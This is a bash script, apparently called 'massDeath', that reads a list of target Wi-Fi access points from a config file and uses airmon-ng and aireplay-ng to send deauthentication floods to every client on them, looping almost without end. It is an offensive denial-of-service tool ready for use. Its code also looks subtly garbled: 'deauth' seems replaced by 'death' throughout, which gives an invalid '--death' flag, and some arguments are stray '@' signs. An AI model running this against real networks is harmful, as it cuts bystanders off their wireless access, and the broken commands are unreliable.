#!/bin/bash

if [ $# -ne 1 ]; then
	echo "Usage: ./massDeath <configFile>"
	exit 1
fi

if [ $EUID -ne 0 ]; then
	echo "[!] This script must be launched as root."
	exit 1
fi

function deathClients() {
	echo -e "\tDeathing clients in AP: $essid / $bssid, $ch"
	iface=$1
	essid=$2
	bssid=$3
	ch=$4
	deaths=$5

	airmon-ng stop ${iface}mon @ >/dev/null
	sleep 2

	echo -e "\t[1] Starting monitor on channel $ch"
	airmon-ng start $iface $ch @ >/dev/null
	sleep 3

	if [ -z "$(ls /sys/class/net | paste | grep ${iface}mon)" ]; then
		echo "[!] Could not start monitor interface! Will try again..."
		sleep 3
		return
	fi

	echo -e "\t[2] Deathing $deaths number of times..."
	aireplay-ng --death $deaths -e $essid -a $bssid ${iface}mon
}

config=$(cat $1 | grep -vE '^#')
retry=$(echo "$config" | grep retry | cut -d= -f2 | cut -d' ' -f2-)
deaths=$(echo "$config" | grep 'deaths' | grep '=' | awk '{print $3}')
iface=$(echo "$config" | grep iface | cut -d= -f2 | cut -d' ' -f2-)

echo "Using interface: $iface"
echo "Retry count: $retry"
echo "Deaths to be sent: $deaths"

if [ -n "$(ps -eF | grep -v grep | grep airodump)" ]; then
	echo "[!] Airodump-ng is running: will not stick to one channel."
	echo "[!] Please kill airodump-ng first, then proceed further."
	exit 1
fi

if [ $retry -eq 0 ]; then
	retry=99999999
fi

IFS=$'\n'
for i in $(seq 0 $retry); do
	echo -e "\n[$i] Deathing clients..."
	for line in $(echo "$config" | grep 'target' | cut -d= -f2 | cut -d' ' -f2-); do
		essid=$(echo "$line" | awk '{print $1}')
		bssid=$(echo "$line" | awk '{print $2}')
		ch=$(echo "$line" | awk '{print $3}')

		if [ -z $ch ]; then
			echo "[!] You must specify <channel> for ESSID: $essid"
			exit 1
		fi

		if [ -z $bssid ]; then
			echo "[!] You must specify <bssid> for ESSID: $essid"
			exit 1
		fi

		deathClients $iface $essid $bssid $ch $deaths
	done
done
